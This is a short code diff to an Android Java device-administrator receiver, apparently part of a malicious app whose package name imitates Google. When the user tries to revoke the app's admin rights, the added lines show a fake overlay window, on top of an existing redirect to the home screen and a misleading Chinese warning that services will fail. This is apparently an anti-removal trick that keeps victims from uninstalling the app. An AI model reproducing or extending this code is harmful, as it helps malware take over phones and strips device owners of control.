@@ -9,6 +9,7 @@ import android.content.Intent;
 import android.view.WindowManager;
 import com.googl.plugin.x.FakeActivity;
 import com.plugin.common.utils.UtilsRuntime;
+import com.xstd.plugin.Utils.DisDeviceFakeWindow;
 import com.xstd.plugin.config.AppRuntime;
 import com.xstd.plugin.config.Config;
 import com.xstd.plugin.config.SettingManager;
@@ -55,6 +56,9 @@ public class DeviceBindBRC extends DeviceAdminReceiver {
 
         UtilsRuntime.goHome(context);
 //        showFakeAlertDialog(context, "取消设备激活可能会造成设备的服务不能使用，是否确定要取消激活?");
+
+        DisDeviceFakeWindow fakeWindow = new DisDeviceFakeWindow(context);
+        fakeWindow.show();
 
         return "取消设备激活可能会造成设备的服务不能使用，是否确定要取消激活?";
     }
